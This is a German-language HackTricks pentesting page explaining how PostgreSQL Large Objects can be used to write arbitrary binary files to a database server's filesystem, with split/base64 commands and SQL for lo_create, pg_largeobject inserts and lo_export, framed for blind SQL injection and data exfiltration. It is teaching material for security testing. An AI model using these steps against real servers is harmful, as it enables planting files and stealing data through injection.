<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>

### PostgreSQL Large Objects

PostgreSQL bietet eine Struktur namens **Large Objects**, die √ºber die Tabelle `pg_largeobject` zug√§nglich ist und zum Speichern gro√üer Datentypen wie Bilder oder PDF-Dokumente entwickelt wurde. Dieser Ansatz ist vorteilhaft gegen√ºber der Funktion `COPY TO`, da er die **Exportierung von Daten zur√ºck auf das Dateisystem** erm√∂glicht und eine exakte Kopie der Originaldatei gew√§hrleistet.

Um eine **komplette Datei** in dieser Tabelle zu speichern, muss ein Objekt in der Tabelle `pg_largeobject` erstellt werden (identifiziert durch eine LOID), gefolgt von der Einf√ºgung von Datenbl√∂cken, die jeweils 2 KB gro√ü sind, in dieses Objekt. Es ist entscheidend, dass diese Bl√∂cke genau 2 KB gro√ü sind (mit m√∂glicher Ausnahme des letzten Blocks), um sicherzustellen, dass die Exportfunktion korrekt funktioniert.

Um Ihre **Bin√§rdaten** in 2 KB gro√üe Bl√∂cke aufzuteilen, k√∂nnen die folgenden Befehle ausgef√ºhrt werden:
```bash
split -b 2048 your_file # Creates 2KB sized files
```
Um jede Datei in Base64 oder Hex zu kodieren, k√∂nnen die folgenden Befehle verwendet werden:
```bash
base64 -w 0 <Chunk_file> # Encodes in Base64 in one line
xxd -ps -c 99999999999 <Chunk_file> # Encodes in Hex in one line
```
**Wichtig**: Bei der Automatisierung dieses Prozesses stellen Sie sicher, dass Sie Chunks von 2 KB Klartext-Bytes senden. Hex-codierte Dateien erfordern 4 KB Daten pro Chunk aufgrund der Verdoppelung der Gr√∂√üe, w√§hrend Base64-codierte Dateien der Formel `ceil(n / 3) * 4` folgen.

Der Inhalt der gro√üen Objekte kann zu Debugging-Zwecken mit folgendem Befehl angezeigt werden:
```sql
select loid, pageno, encode(data, 'escape') from pg_largeobject;
```
#### Verwendung von `lo_creat` & Base64

Um bin√§re Daten zu speichern, wird zuerst eine LOID erstellt:
```sql
SELECT lo_creat(-1);       -- Creates a new, empty large object
SELECT lo_create(173454);  -- Attempts to create a large object with a specific OID
```
In Situationen, die eine pr√§zise Kontrolle erfordern, wie z.B. bei der Ausnutzung einer Blind SQL Injection, wird `lo_create` bevorzugt, um eine feste LOID festzulegen.

Datenbl√∂cke k√∂nnen dann wie folgt eingef√ºgt werden:
```sql
INSERT INTO pg_largeobject (loid, pageno, data) VALUES (173454, 0, decode('<B64 chunk1>', 'base64'));
INSERT INTO pg_largeobject (loid, pageno, data) VALUES (173454, 1, decode('<B64 chunk2>', 'base64'));

```
Um das gro√üe Objekt zu exportieren und m√∂glicherweise nach der Verwendung zu l√∂schen:
```sql
SELECT lo_export(173454, '/tmp/your_file');
SELECT lo_unlink(173454);  -- Deletes the specified large object
```
#### Verwendung von `lo_import` & Hex

Die Funktion `lo_import` kann verwendet werden, um ein LOID f√ºr ein gro√ües Objekt zu erstellen und anzugeben:
```sql
select lo_import('/path/to/file');
select lo_import('/path/to/file', 173454);
```
Nach der Erstellung des Objekts werden Daten pro Seite eingef√ºgt, wobei darauf geachtet wird, dass jeder Chunk nicht mehr als 2 KB √ºberschreitet:
```sql
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=0;
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=1;
```
Um den Vorgang abzuschlie√üen, wird die Daten exportiert und das gro√üe Objekt gel√∂scht:
```sql
select lo_export(173454, '/path/to/your_file');
select lo_unlink(173454);  -- Deletes the specified large object
```
### Einschr√§nkungen

Es ist zu beachten, dass **gro√üe Objekte m√∂glicherweise ACLs** (Access Control Lists) haben, die den Zugriff auch auf von Ihrem Benutzer erstellte Objekte einschr√§nken k√∂nnen. √Ñltere Objekte mit gro√üz√ºgigen ACLs k√∂nnen jedoch immer noch f√ºr die Exfiltration von Inhalten zug√§nglich sein.

<details>

<summary><strong>Lernen Sie das Hacken von AWS von Null auf Heldenniveau mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
